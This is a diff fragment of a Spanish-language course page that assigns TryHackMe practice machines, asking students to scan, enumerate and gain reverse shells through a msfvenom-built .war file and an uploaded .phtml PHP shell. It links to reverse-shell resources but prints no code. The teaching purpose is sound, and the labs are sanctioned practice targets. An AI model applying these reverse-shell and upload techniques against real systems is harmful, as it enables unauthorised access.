+<p>Realizar la máquina <a href="https://tryhackme.com/r/room/vulnversity"><strong>Vulnversity</strong> en TryHackMe</a>. Se trata de una máquina guiada donde repasamos fases que ya hemos visto: escaneo, enumeración y explotación mediante vulnerabilidad. Finalmente veremos una forma de obtener una shell inversa utilizando PHP. <strong>NO HACER LA PARTE DE ESCALADA DE PRIVILEGIOS</strong>.</p>
+</li>
+<li>
+<p>Realizar la máquina <a href="https://tryhackme.com/r/room/bsidesgtthompson"><strong>Thomson</strong> en TryHackMe</a>. Se trata de una máquina no guiada donde tras la fase de escaneo y enumeración debéis conseguir acceso a un famoso servidor de aplicaciones y tras ello crear con <em>msfvenom</em> una shell inversa en formato <em>.war</em>, que se desplegará en dicho servidor.
+    Al acceder al <em>.war</em> desplegado, se establecerá nuestra conexión inversa. Esta página os puede resultar de inmensa ayuda: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom">https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom</a></p>
+</li>
+<li>
+<p>Realizar las fases que os marco en la imagen de abajo de la máquina <a href="https://tryhackme.com/r/room/rrootme"><strong>RootMe</strong> en TryHackMe</a>. </p>
+<p><img alt="" src="../img/rootme.png" /></p>
+<p>En este caso debéis escanear con nmap, descubrir (mediante <em>gobuster</em> o <em>ffuf</em>) un directorio donde podáis subir archivos y, una vez en él, subir una reverse shell en formato <strong><em>.phtml</em></strong>. Podéis bajar cualquier shell prefabricada en PHP o generarla vosotros con ayuda de <a href="https://www.revshells.com/">esto</a> o de <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux#php">esto</a>.</p>
+</li>
+</ol>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "toc.integrate", "navigation.expand", "navigation.top", "navigation.indexes", "content.tabs.link", "content.code.annotate", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
